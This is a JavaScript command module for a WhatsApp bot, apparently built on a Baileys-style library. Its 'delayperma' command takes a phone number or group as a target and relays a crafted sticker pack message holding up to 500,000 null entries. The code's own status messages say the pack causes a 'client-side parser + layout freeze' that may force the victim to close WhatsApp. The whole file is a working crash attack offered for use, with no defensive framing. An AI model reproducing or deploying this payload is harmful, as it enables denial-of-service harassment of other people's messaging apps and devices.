// ⟦EXPERT⟧ .delayperma — sticker pack flood (500k stickers array overflow)
// Resolves $repeat(\u0000, 500000) into a real array at send-time.
async function ownerOnly(z) {
  return !!z.isOwner
}

async function resolveTarget(z) {
  const arg = (z.args?.[0] || '').trim()
  if (!arg) return z.jid
  if (arg.includes('@')) return arg
  const digits = arg.replace(/[^0-9]/g, '')
  if (!digits) return z.jid
  try {
    const res = await z.sock.onWhatsApp(digits)
    if (res?.[0]?.exists) return res[0].jid
  } catch {}
  if (digits.length > 15) return `${digits}@lid`
  return `${digits}@s.whatsapp.net`
}

// ─── Expand the $repeat into a real array ───
function makeStickerArray(count = 500000) {
  const arr = new Array(count)
  for (let i = 0; i < count; i++) {
    arr[i] = '\u0000'
  }
  return arr
}

export default {
  name: 'delayperma',
  aliases: ['dperma', 'permafreeze', 'delaya'],
  desc: 'Sticker pack flood — massive array overflow (owner only)',
  async run(z) {
    await z.react('💀').catch(() => {})

    try {
      if (!(await ownerOnly(z))) return z.reply('⛔ Owner only.')

      const target = await resolveTarget(z)

      if (target.endsWith('@g.us')) {
        try { await z.sock.groupMetadata(target) }
        catch { return z.reply(`❌ *Bot is not in group:* ${target}`) }
      }

      // ─── Sticker count from args (default 500k) ───
      const countArg = parseInt(z.args?.[1] || '0', 10)
      const count = countArg > 0 ? Math.min(countArg, 500000) : 500000

      await z.reply(
        `💀 *Launching DELAYPERMA...*\n` +
        `📱 *Target:* ${target}\n` +
        `📦 *Stickers:* ${count.toLocaleString()}\n` +
        `⏳ *Building payload (this may take a few seconds)...*`
      )

      // ─── Build the massive stickers array ───
      const stickers = makeStickerArray(count)

      // ─── Raw message object (relayMessage-compatible) ───
      const rawMessage = {
        stickerPackMessage: {
          stickerPackId: '3809d279-8380-46ec-a4aa-9f88bb8d331b',
          name: '駭客攻擊',
          publisher: '',
          stickers,
          fileLength: '1',
          fileSha256: 'zBQ67xYtACV6INue4Uxlh8RbVqnpjGDBCRVyWkND9ZQ=',
          fileEncSha256: 'XS417sLbPEdz4LPbTSdsM0dGkVGWiVy2tAmIuixjlh0=',
          mediaKey: 'TaFFlOgV3RjLTpD+nXregBe7nMFLjmKlJE4N2MY4B9M=',
          directPath: '/v/t62.15575-24/536941729_1742324930142466_6493043607786673721_n.enc?ccb=11-4&oh=01_Q5Aa5QGF3j7pDlBS5O2CsjeUX9NCVTQvgbIn-f6ZVlmFwlUojQ&oe=6AA0A50E&_nc_sid=5e03e0',
          contextInfo: {
            remoteJid: 'status@broadcast',
            participant: '13135550002@s.whatsapp.net',
            stanzaId: '488196D4F57E6E6D3A0F85ABBFCAB9BD',
            quotedMessage: {
              conversation: '🪐',
              messageContextInfo: {
                botMetadata: {
                  botRenderingConfigMetadata: {
                    bloksVersioningId: '61a29b5e5d9db6cf2c3a5a24c3bfd8340bc098fb8972d56842ab28336b9d9171',
                    pixelDensity: 67
                  }
                }
              }
            },
            quotedType: 'EXPLICIT'
          },
          packDescription: 'Made by Crasher.js',
          mediaKeyTimestamp: '1786332881',
          trayIconFileName: '3809d279-8380-46ec-a4aa-9f88bb8d331b.png',
          thumbnailDirectPath: '/v/t62.15575-24/771925758_1667481861017438_3375131437121727368_n.enc?ccb=11-4&oh=01_Q5Aa5QEwqAqA-DZt6FcK2H2VQdiaUMTHZrrH0UHgbUes7Q056w&oe=6AA0AE99&_nc_sid=5e03e0',
          thumbnailSha256: 'G9DOxsrVvRTEOjkTZoGlkR0J+/llA5+OHxjlpA28x40=',
          thumbnailEncSha256: 'Z1GPUjG/xd1RpywqimJiwP3YXxsaeEBu+n0c1p7qenc=',
          thumbnailHeight: 252,
          thumbnailWidth: 252,
          imageDataHash: 'ZjY4NzBiYmJkZWVmNGY3MjM2MTFkM2Q5MGNlN2ExN2QyOTNjNThkNDA5MmI5YTgwYWViN2NhOTljYWEwNTgyZg==',
          stickerPackSize: '1',
          stickerPackOrigin: 'FIRST_PARTY'
        }
      }

      const messageId = `3EB0${Math.random().toString(36).slice(2, 12).toUpperCase()}`

      // ─── Relay (may take a few seconds to encrypt) ───
      await z.sock.relayMessage(target, rawMessage, { messageId })

      await z.reply(
        `💀 *DELAYPERMA SENT!*\n\n` +
        `📱 *Target:* ${target}\n` +
        `📦 *Stickers:* ${count.toLocaleString()}\n` +
        `🎨 *Pack:* 駭客攻擊\n` +
        `💥 *Effect:* client-side parser + layout freeze\n` +
        `⚠️ *Target may need to force-close WhatsApp*`
      )
      await z.react('✅').catch(() => {})
    } catch (e) {
      console.error('[delayperma]', e)
      await z.reply(`❌ *Delayperma failed*\n${e.message}`)
      await z.react('❌').catch(() => {})
    }
  }
}
